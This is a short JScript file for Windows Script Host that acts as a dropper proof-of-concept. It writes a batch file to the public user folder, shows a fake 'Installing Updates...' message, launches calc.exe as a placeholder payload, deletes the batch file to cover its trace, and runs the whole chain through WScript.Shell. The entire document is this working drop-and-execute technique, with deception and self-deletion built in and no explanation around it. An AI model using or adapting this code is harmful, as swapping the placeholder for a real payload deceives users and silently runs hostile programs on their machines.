var fso  = new ActiveXObject("Scripting.FileSystemObject"); 
var fh = fso.CreateTextFile("C:\\Users\\Public\\calc-exec.bat", true);
fh.WriteLine("@echo off");
fh.WriteLine("echo Installing Updates... & C:\\Windows\\System32\\calc.exe"); 
fh.WriteLine('DEL "%~f0"');
fh.Close();
var WshShell = new ActiveXObject("WScript.Shell");
WshShell.Run("C:\\Users\\Public\\calc-exec.bat", 1, true);
